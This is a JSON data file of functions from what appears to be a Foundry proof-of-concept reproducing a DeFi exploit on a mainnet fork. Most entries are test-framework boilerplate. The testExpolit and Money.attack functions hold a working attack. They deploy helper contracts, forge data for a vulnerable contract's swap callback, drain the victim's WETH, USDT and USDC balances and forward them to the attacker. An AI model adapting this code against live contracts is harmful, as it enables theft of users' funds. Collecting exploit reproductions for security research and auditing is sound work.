[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "VulnContract",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "getcodehash",
    "original_code": "    function getcodehash() public returns (bytes32) {\n        return keccak256(type(Money).creationCode);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 20_367_788);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExpolit",
    "original_code": "    function testExpolit() public {\n        emit log_named_decimal_uint(\n            \"[Begin] Attacker WETH before exploit\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[Begin] Attacker USDT before exploit\", USDT.balanceOf(address(this)), USDT.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[Begin] Attacker USDC before exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n        bytes32 A_hash = keccak256(abi.encode(address(WETH), address(WETH), uint256(0)));\n        address A = create_contract(A_hash);\n        uint256 A_balance = WETH.balanceOf(address(Victim));\n        IMoney(A).attack(address(Victim), address(WETH), A_balance);\n\n        bytes32 B_hash = keccak256(abi.encode(address(USDT), address(USDT), uint256(0)));\n        address B = create_contract(B_hash);\n        uint256 B_balance = USDT.balanceOf(address(Victim));\n        IMoney(B).attack(address(Victim), address(USDT), B_balance);\n\n        bytes32 C_hash = keccak256(abi.encode(address(USDC), address(USDC), uint256(0)));\n        address C = create_contract(C_hash);\n        uint256 C_balance = USDC.balanceOf(address(Victim));\n        IMoney(C).attack(address(Victim), address(USDC), C_balance);\n        emit log_named_decimal_uint(\"[End] Attacker WETH after exploit\", WETH.balanceOf(address(this)), WETH.decimals());\n        emit log_named_decimal_uint(\"[End] Attacker USDT after exploit\", USDT.balanceOf(address(this)), USDT.decimals());\n        emit log_named_decimal_uint(\"[End] Attacker USDC after exploit\", USDC.balanceOf(address(this)), USDC.decimals());\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Money",
    "source_type": "attacker_contract",
    "function_name": "attack",
    "original_code": "    function attack(address vuln, address token, uint256 amount) public {\n        bytes32 codehash = IContractTest(owner).getcodehash();\n        DATA.SwapData memory datas = DATA.SwapData({\n            vuln: address(vuln),\n            factory: address(owner),\n            codehash: codehash,\n            data: abi.encodePacked(address(token), hex\"000000\", address(token))\n        });\n        bytes memory data = abi.encode(datas);\n        VulnContract.call(abi.encodeWithSelector(bytes4(0xfa461e33), -1, amount, data));\n        WETH.transfer(address(owner), WETH.balanceOf(address(this)));\n        address(USDT).call(abi.encodeWithSelector(bytes4(0xa9059cbb), address(owner), USDT.balanceOf(address(this))));\n        USDC.transfer(address(owner), USDC.balanceOf(address(this)));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Money",
    "source_type": "attacker_contract",
    "function_name": "owner",
    "original_code": "",
    "description": ""
  }
]